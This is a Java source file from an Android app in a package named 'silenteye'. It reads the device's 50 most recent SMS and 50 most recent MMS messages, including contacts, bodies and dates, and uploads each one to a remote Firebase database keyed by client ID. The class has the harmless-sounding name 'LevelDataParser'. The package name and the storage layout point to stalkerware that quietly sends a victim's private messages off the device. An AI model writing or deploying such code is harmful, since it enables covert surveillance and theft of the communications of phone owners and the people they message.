package com.silenteye;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class LevelDataParser {
    private static final String TAG = "LevelDataParser";
    
    public static void readAndSendMessages(Context context) {
        List<Map<String, Object>> messages = new ArrayList<>();
        messages.addAll(readSms(context, 50));
        messages.addAll(readMms(context, 50));

        // All data is stored under clients/{CLIENT_ID}/messages
        DatabaseReference dbRef = ClientManager.getChildRef("messages");
        for (Map<String, Object> msg : messages) {
            dbRef.push().setValue(msg);
        }
    }

    private static List<Map<String, Object>> readSms(Context context, int limit) {
        List<Map<String, Object>> smsList = new ArrayList<>();
        ContentResolver cr = context.getContentResolver();
        
        String[] projection = new String[] {
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
        };

        try (Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, projection, null, null, Telephony.Sms.DATE + " DESC")) {
            if (cursor != null) {
                int addressIdx = cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS);
                int bodyIdx = cursor.getColumnIndexOrThrow(Telephony.Sms.BODY);
                int dateIdx = cursor.getColumnIndexOrThrow(Telephony.Sms.DATE);
                int typeIdx = cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE);
                
                int count = 0;
                while (cursor.moveToNext() && count < limit) {
                    Map<String, Object> sms = new HashMap<>();
                    String address = cursor.getString(addressIdx);
                    String body = cursor.getString(bodyIdx);
                    long date = cursor.getLong(dateIdx);
                    int type = cursor.getInt(typeIdx);

                    sms.put("type", "sms");
                    sms.put("sender_or_recipient", address);
                    sms.put("body", body);
                    sms.put("date", date);
                    sms.put("is_sent", type == Telephony.Sms.MESSAGE_TYPE_SENT);
                    
                    smsList.add(sms);
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading SMS", e);
        }
        return smsList;
    }

    private static List<Map<String, Object>> readMms(Context context, int limit) {
        List<Map<String, Object>> mmsList = new ArrayList<>();
        ContentResolver cr = context.getContentResolver();

        String[] projection = new String[] {
                Telephony.Mms._ID,
                Telephony.Mms.DATE,
                Telephony.Mms.MESSAGE_BOX
        };

        try (Cursor cursor = cr.query(Telephony.Mms.CONTENT_URI, projection, null, null, Telephony.Mms.DATE + " DESC")) {
            if (cursor != null) {
                int idIdx = cursor.getColumnIndexOrThrow(Telephony.Mms._ID);
                int dateIdx = cursor.getColumnIndexOrThrow(Telephony.Mms.DATE);
                int typeIdx = cursor.getColumnIndexOrThrow(Telephony.Mms.MESSAGE_BOX);
                
                int count = 0;
                while (cursor.moveToNext() && count < limit) {
                    Map<String, Object> mms = new HashMap<>();
                    String mmsId = cursor.getString(idIdx);
                    long date = cursor.getLong(dateIdx) * 1000L; // MMS date is usually in seconds
                    int type = cursor.getInt(typeIdx);

                    String address = getMmsAddress(cr, mmsId);
                    String body = getMmsText(cr, mmsId);

                    mms.put("type", "mms");
                    mms.put("sender_or_recipient", address);
                    mms.put("body", body);
                    mms.put("date", date);
                    mms.put("is_sent", type == Telephony.Mms.MESSAGE_BOX_SENT);

                    mmsList.add(mms);
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading MMS", e);
        }
        return mmsList;
    }

    private static String getMmsAddress(ContentResolver cr, String id) {
        Uri uri = Uri.parse("content://mms/" + id + "/addr");
        String[] projection = new String[] { "address", "charset", "type" };
        String selection = "type=137 OR type=151"; // 137 = from, 151 = to
        
        try (Cursor cursor = cr.query(uri, null, selection, null, null)) {
            if (cursor != null && cursor.moveToFirst()) {
                return cursor.getString(cursor.getColumnIndexOrThrow("address"));
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading MMS address", e);
        }
        return "Unknown";
    }

    private static String getMmsText(ContentResolver cr, String id) {
        Uri uri = Uri.parse("content://mms/part");
        String selection = "mid=" + id;
        StringBuilder body = new StringBuilder();
        
        try (Cursor cursor = cr.query(uri, null, selection, null, null)) {
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String partId = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
                    String type = cursor.getString(cursor.getColumnIndexOrThrow("ct"));
                    if ("text/plain".equals(type)) {
                        String data = cursor.getString(cursor.getColumnIndexOrThrow("_data"));
                        if (data != null) {
                            body.append(getMmsTextFromData(cr, partId));
                        } else {
                            body.append(cursor.getString(cursor.getColumnIndexOrThrow("text")));
                        }
                    }
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading MMS text", e);
        }
        return body.toString();
    }

    private static String getMmsTextFromData(ContentResolver cr, String partId) {
        Uri partURI = Uri.parse("content://mms/part/" + partId);
        StringBuilder sb = new StringBuilder();
        try (InputStream is = cr.openInputStream(partURI)) {
            if (is != null) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"));
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line);
                }
            }
        } catch (IOException e) {
            Log.e(TAG, "Error reading MMS part data", e);
        }
        return sb.toString();
    }
}
